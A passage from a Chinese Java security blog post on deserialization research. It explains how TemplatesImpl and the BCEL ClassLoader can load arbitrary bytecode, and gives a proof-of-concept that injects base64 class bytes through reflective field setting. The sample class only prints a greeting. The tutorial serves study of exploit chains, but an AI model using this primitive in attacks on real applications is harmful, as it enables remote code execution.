+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">static</span> <span style="color:#ff636f">final</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">TransletClassLoader</span> <span style="color:#ff636f">extends</span> <span style="color:#58a1dd">ClassLoader</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#ff636f">final</span> <span style="color:#58a1dd">Map</span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">String</span>,<span style="color:#58a1dd">Class</span><span style="color:#ff636f">&gt;</span> <span style="color:#58a1dd">_loadedExternalExtensionFunctions</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>         <span style="color:#58a1dd">TransletClassLoader</span>(<span style="color:#58a1dd">ClassLoader</span> <span style="color:#58a1dd">parent</span>) {
+</span></span><span style="display:flex;"><span>             <span style="color:#ff636f">super</span>(<span style="color:#58a1dd">parent</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">_loadedExternalExtensionFunctions</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">TransletClassLoader</span>(<span style="color:#58a1dd">ClassLoader</span> <span style="color:#58a1dd">parent</span>,<span style="color:#58a1dd">Map</span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">String</span>, <span style="color:#58a1dd">Class</span><span style="color:#ff636f">&gt;</span> <span style="color:#58a1dd">mapEF</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">super</span>(<span style="color:#58a1dd">parent</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">_loadedExternalExtensionFunctions</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">mapEF</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">&lt;?&gt;</span> <span style="color:#58a1dd">loadClass</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">ClassNotFoundException</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Class</span><span style="color:#ff636f">&lt;?&gt;</span> <span style="color:#58a1dd">ret</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic">// The _loadedExternalExtensionFunctions will be empty when the</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic">// SecurityManager is not set and the FSP is turned off</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">_loadedExternalExtensionFunctions</span> <span style="color:#ff636f">!=</span> <span style="color:#ff636f">null</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">ret</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">_loadedExternalExtensionFunctions</span>.<span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">name</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ret</span> <span style="color:#ff636f">==</span> <span style="color:#ff636f">null</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">ret</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">super</span>.<span style="color:#58a1dd">loadClass</span>(<span style="color:#58a1dd">name</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#58a1dd">ret</span>;
+</span></span><span style="display:flex;"><span>         }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">         * Access to final protected superclass member from outer class.
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">         */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Class</span> <span style="color:#58a1dd">defineClass</span>(<span style="color:#ff636f">final</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">b</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#58a1dd">defineClass</span>(<span style="color:#ff636f">null</span>, <span style="color:#58a1dd">b</span>, <span style="color:#58a1dd">0</span>, <span style="color:#58a1dd">b</span>.<span style="color:#58a1dd">length</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>这个类里重写了defineClass 方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的defineClass 由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。我们从TransletClassLoader#defineClass() 向前追溯一下调用链：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">TemplatesImpl</span>#<span style="color:#58a1dd">getOutputProperties</span>() <span style="color:#ff636f">-&gt;</span> <span style="color:#58a1dd">TemplatesImpl</span>#<span style="color:#58a1dd">newTransformer</span>() <span style="color:#ff636f">-&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">TemplatesImpl</span>#<span style="color:#58a1dd">getTransletInstance</span>() <span style="color:#ff636f">-&gt;</span> <span style="color:#58a1dd">TemplatesImpl</span>#<span style="color:#58a1dd">defineTransletClasses</span>()
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">-&gt;</span> <span style="color:#58a1dd">TransletClassLoader</span>#<span style="color:#58a1dd">defineClass</span>()</span></span></code></pre></div><p>追到最前面两个方法TemplatesImpl#getOutputProperties() 、TemplatesImpl#newTransformer() ，这两者的作用域是public，可以被外部调用。我们尝试用newTransformer() 构造一个简单的POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// source: bytecodes/HelloTemplateImpl.java</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">code</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Base64</span>.<span style="color:#58a1dd">getDecoder</span>().<span style="color:#58a1dd">decode</span>(<span style="color:#a6be9d">&#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#58a1dd">TemplatesImpl</span> <span style="color:#58a1dd">obj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TemplatesImpl</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_bytecodes&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[][]</span> {<span style="color:#58a1dd">code</span>});
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_name&#34;</span>, <span style="color:#a6be9d">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_tfactory&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformerFactoryImpl</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">obj</span>.<span style="color:#58a1dd">newTransformer</span>();
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>其中， setFieldValue 方法用来设置私有属性，可见，这里我设置了三个属性： _bytecodes 、<em>name和_tfactory 。</em></p>
+<ul>
+<li>_bytecodes 是由字节码组成的数组；</li>
+<li>_name 可以是任意字符串，只要不为null即可；</li>
+<li>_tfactory 需要是一个TransformerFactoryImpl 对象，因为TemplatesImpl#defineTransletClasses() 方法里有调用到_tfactory.getExternalExtensionsMap() ，如果是null会出错。</li>
+</ul>
+<p>另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。</p>
+<p>所以，我们需要构造一个特殊的类：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">com.test.TemplatesImpl</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.org.apache.xalan.internal.xsltc.DOM</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.org.apache.xalan.internal.xsltc.TransletException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">TempClass</span> <span style="color:#ff636f">extends</span> <span style="color:#58a1dd">AbstractTranslet</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">transform</span>(<span style="color:#58a1dd">DOM</span> <span style="color:#58a1dd">document</span>, <span style="color:#58a1dd">SerializationHandler</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">handlers</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">TransletException</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">transform</span>(<span style="color:#58a1dd">DOM</span> <span style="color:#58a1dd">document</span>, <span style="color:#58a1dd">DTMAxisIterator</span> <span style="color:#58a1dd">iterator</span>, <span style="color:#58a1dd">SerializationHandler</span> <span style="color:#58a1dd">handler</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">TransletException</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">TempClass</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">super</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Hello TemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h5 id="利用bcel-classloader加载字节码" class="heading-element"><span>0.0.0.5  利用BCEL ClassLoader加载字节码</span>
+  <a href="#%e5%88%a9%e7%94%a8bcel-classloader%e5%8a%a0%e8%bd%bd%e5%ad%97%e8%8a%82%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。所以，bcel字节码也必然在我们的讨论范围内，且占据着比较重要的地位。</p>
+<p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。</p>
+</blockquote>
+<p>关于BCEL的详细介绍，请阅读https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</p>
+<p>我们可以通过BCEL提供的两个类Repository 和Utility 来利用： Repository 用于将一个Java Class先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将原生的字节码转换成BCEL格式的字节码：</p>
+<p>而BCEL ClassLoader用于加载这串特殊的“字节码”，并可以执行其中的代码：</p>
+<p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的TemplatesImpl 都出自于同一个第三方库，Apache Xalan。</p>
+<p>但是由于各种原因（详见前面所说的《BCEL ClassLoader去哪了》），在Java 8u251的更新中，这个ClassLoader被移除了，所以之后只能且用且珍惜了。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-16 09:39:01">Updated on 2024-08-16&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8/" class="post-nav-item" rel="prev" title="CC6"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CC6</a>
+      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7/" class="post-nav-item" rel="next" title="CC3">CC3<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
